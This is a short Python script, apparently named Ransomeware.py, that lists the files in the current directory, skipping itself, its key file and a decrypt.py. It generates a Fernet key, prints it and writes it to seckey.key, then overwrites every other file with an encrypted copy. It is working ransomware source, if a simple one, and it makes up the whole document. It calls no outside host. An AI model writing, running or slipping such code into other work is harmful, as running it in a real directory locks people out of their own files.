import os
from cryptography.fernet import Fernet

files = []

# Collect files to encrypt
for file in os.listdir():
    if file == 'Ransomeware.py' or file == 'seckey.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate key and save it
key = Fernet.generate_key()
print(f"Encryption Key: {key}")

with open("seckey.key", "wb") as k:
    k.write(key)

# Encrypt each file
for file in files:
    with open(file, 'rb') as theFile:
        content = theFile.read()
    encrypted_content = Fernet(key).encrypt(content)
    with open(file, 'wb') as theFile:
        theFile.write(encrypted_content)
